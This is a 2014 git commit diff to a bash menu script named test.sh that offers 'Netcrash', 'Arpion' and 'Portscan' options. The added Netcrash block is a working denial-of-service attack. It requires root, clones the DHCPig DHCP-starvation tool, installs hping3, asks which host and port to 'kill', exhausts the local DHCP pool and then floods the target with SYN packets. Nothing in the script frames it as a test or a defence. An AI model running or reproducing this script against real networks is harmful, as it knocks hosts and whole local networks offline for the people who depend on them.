118ebecdfadc8ca3a2d47ce6edcb1aed01b4f6b5
zergsaint <ljm.borjesson@gmail.com>
2014-05-13 21:14:43 +0200

    Update test.sh

--- test.sh
+++ test.sh
@@ -43,7 +43,38 @@ echo -e "${RED_TEXT}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 OPTIONS="Netcrash Arpion Portscan Quit"
            select opt in $OPTIONS; do
                if [ "$opt" = "Netcrash" ]; then
-                bash netcrash.sh
+##########Startar#################
+#Init
+FILE="/tmp/out.$$"
+GREP="/bin/grep"
+#Only root should run this.
+if [[ $EUID -ne 0 ]]; then
+echo "Run as root." 1>&2
+exit 1
+fi
+
+#Prerequisites
+mkdir -p /opt/netcrash
+cd /opt/netcrash
+git clone https://github.com/kamorin/DHCPig.git
+sudo apt-get install hping3
+#Let's kill shit
+echo "What host do you want to kill?"
+read host
+echo "What port? If unsure, use 80. Might work."
+read port
+echo "What interface? (default: eth0)"
+read -r -p "Do you want to change interface? (Default: eth0) [y/N] " response
+case $response in
+    [yY][eE][sS]|[yY])
+        read iface
+        ;;
+    *)
+        iface=eth0
+        ;;
+esac
+python DHCPig/pig.py $iface
+hping3 -i u1 -S -p $port $host
                elif [ "$opt" = "Arpion" ]; then
 ##############startar#############
 if [[ $EUID -ne 0 ]]; then
